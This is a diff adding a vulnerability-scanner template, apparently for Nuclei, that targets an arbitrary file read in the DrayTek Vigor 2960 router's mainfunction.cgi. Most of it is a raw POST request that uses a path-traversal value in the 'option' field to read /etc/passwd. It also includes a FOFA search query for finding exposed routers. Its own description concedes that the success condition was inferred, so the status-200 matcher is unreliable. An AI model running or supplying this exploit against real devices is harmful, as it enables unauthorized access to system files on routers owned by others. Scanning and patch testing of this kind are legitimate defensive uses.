@@ -1,0 +1,46 @@
+id: poc-9d5a5d848416217856c7
+info:
+  name: DraytekVigor2960路由器mainfunction任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/9d5a5d848416217856c72ffb3ed06eed
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 9d5a5d848416217856c72ffb3ed06eed
+    fofa: + fofa`title="Vigor 2960"`
+http:
+- raw:
+  - 'POST /cgi-bin/mainfunction.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: close
+
+    Content-Length: 94
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept: */*
+
+    Sec-Fetch-Site: same-origin
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Dest: empty
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+
+
+    action=getSyslogFile&option=../../etc/passwd'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
